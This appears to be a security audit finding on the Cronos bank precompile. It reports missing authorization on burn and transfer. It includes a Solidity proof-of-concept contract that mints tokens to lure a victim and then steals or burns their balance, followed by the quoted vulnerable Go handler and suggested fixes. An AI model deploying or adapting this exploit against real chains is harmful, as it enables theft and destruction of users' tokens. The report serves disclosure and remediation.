### Title
Unauthorized Transfer and Burn of Native Tokens via Bank Precompile — (`x/cronos/keeper/precompiles/bank.go`)

---

### Summary

The `BankContract` precompile at address `0x0000000000000000000000000000000000000064` exposes `burn` and `transfer` methods that derive the operated denom from `contract.Caller()` (the calling EVM contract's address) but apply no authorization check verifying that the calling contract has permission to act on behalf of the `sender`/`recipient` address supplied as an argument. Any unprivileged EVM contract can therefore burn or transfer native tokens of its own denom (`evm/<callerAddress>`) from **any** holder's account without that holder's consent.

---

### Finding Description

The `Run` method of `BankContract` handles `mint`, `burn`, and `transfer` calls from any EVM contract. The denom operated on is always `evm/<contract.Caller()>`, binding the token namespace to the calling contract. However, the `burn` and `transfer` cases accept an arbitrary address as the account to debit:

```go
// burn case
recipient := args[0].(common.Address)   // address to burn FROM — named misleadingly
...
addr := sdk.AccAddress(recipient.Bytes())
if err := bc.checkBlockedAddr(addr); err != nil { ... }   // only checks module-blocked list
denom := EVMDenom(contract.Caller())
// burns from addr — no check that contract.Caller() == addr or has approval
bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, ...)
bc.bankKeeper.BurnCoins(ctx, types.ModuleName, ...)
```

```go
// transfer case
sender := args[0].(common.Address)   // arbitrary sender
recipient := args[1].(common.Address)
...
from := sdk.AccAddress(sender.Bytes())
to   := sdk.AccAddress(recipient.Bytes())
if err := bc.checkBlockedAddr(to); err != nil { ... }   // only checks module-blocked list
denom := EVMDenom(contract.Caller())
// transfers from arbitrary `from` — no check that contract.Caller() == from or has approval
bc.bankKeeper.SendCoins(ctx, from, to, ...)
```

The only guard present is `checkBlockedAddr`, which only rejects Cosmos SDK module accounts. There is no check that `contract.Caller()` equals the `sender`/`recipient` address, nor any allowance/approval mechanism. [1](#0-0) [2](#0-1) 

---

### Impact Explanation

**Critical — Unauthorized burn and transfer of precompile-controlled native assets.**

A malicious EVM contract deployed at address `0xMAL` controls the denom `evm/0xMAL`. If any user holds tokens of that denom (e.g., received as DeFi rewards, LP tokens, or any protocol-issued balance), the malicious contract can:

1. Call `bank.burn(victimAddress, victimBalance)` → destroys the victim's tokens with no consent.
2. Call `bank.transfer(victimAddress, attackerAddress, victimBalance)` → steals the victim's tokens with no consent.

This is an unauthorized burn/transfer of precompile-controlled assets, matching the Critical impact tier. [3](#0-2) [4](#0-3) 

---

### Likelihood Explanation

The entry path is fully unprivileged: any EVM transaction can deploy a contract and call the bank precompile. The only prerequisite is that victims hold tokens of the attacker's denom, which is achievable by any contract that first mints tokens to users (e.g., as part of a DeFi protocol, staking rewards, or airdrop). The `IBankModule` interface is publicly documented and the precompile address is a well-known constant. [5](#0-4) [6](#0-5) 

---

### Recommendation

For `burn`: verify that `contract.Caller()` equals the address being burned from, or that an explicit on-chain allowance has been granted:

```go
// burn: only allow burning from the calling contract's own account,
// or require an explicit approval stored in state.
if recipient != contract.Caller() {
    return nil, errors.New("burn: caller is not the token holder")
}
```

For `transfer`: verify that `contract.Caller()` equals `sender`, or implement an ERC20-style allowance mechanism at the native layer:

```go
if sender != contract.Caller() {
    return nil, errors.New("transfer: caller is not the sender")
}
```

Alternatively, restrict `burn` to only burn from the calling contract's own module account, and require users to explicitly call `burn` themselves (as shown in the `TestBank.sol` integration test pattern where `msg.sender` is always passed). [7](#0-6)

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IBankModule {
    function mint(address, uint256) external payable returns (bool);
    function burn(address, uint256) external payable returns (bool);
    function transfer(address, address, uint256) external payable returns (bool);
    function balanceOf(address, address) external view returns (uint256);
}

contract MaliciousBank {
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: lure victim — mint evm/<this> tokens to victim as "rewards"
    function lureVictim(address victim, uint256 amount) external {
        bank.mint(victim, amount);
    }

    // Step 2: steal — transfer victim's evm/<this> tokens to attacker without consent
    function steal(address victim, address attacker) external {
        uint256 bal = bank.balanceOf(address(this), victim);
        bank.transfer(victim, attacker, bal);  // no approval from victim required
    }

    // Alternative step 2: destroy victim's tokens
    function destroy(address victim) external {
        uint256 bal = bank.balanceOf(address(this), victim);
        bank.burn(victim, bal);  // no approval from victim required
    }
}
```

After `lureVictim(alice, 1000)`, calling `steal(alice, attacker)` transfers all 1000 `evm/<MaliciousBank>` native tokens from Alice to the attacker. The `BankContract.Run` transfer handler executes `bankKeeper.SendCoins(alice, attacker, ...)` with no authorization check. [2](#0-1) [8](#0-7)

func (bc *BankContract) Run(evm *vm.EVM, contract *vm.Contract, readonly bool) ([]byte, error) {
	// parse input
	methodID := contract.Input[:4]
	method, err := bankABI.MethodById(methodID)
	if err != nil {
		return nil, err
	}
	stateDB := evm.StateDB.(ExtStateDB)
	precompileAddr := bc.Address()
	switch method.Name {
	case MintMethodName, BurnMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		recipient := args[0].(common.Address)
		amount := args[1].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		addr := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(addr); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if method.Name == "mint" {
				if err := bc.bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to mint coins in precompiled contract")
				}
				if err := bc.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, addr, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send mint coins to account")
				}
			} else {
				if err := bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send burn coins to module")
				}
				if err := bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to burn coins in precompiled contract")
				}
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
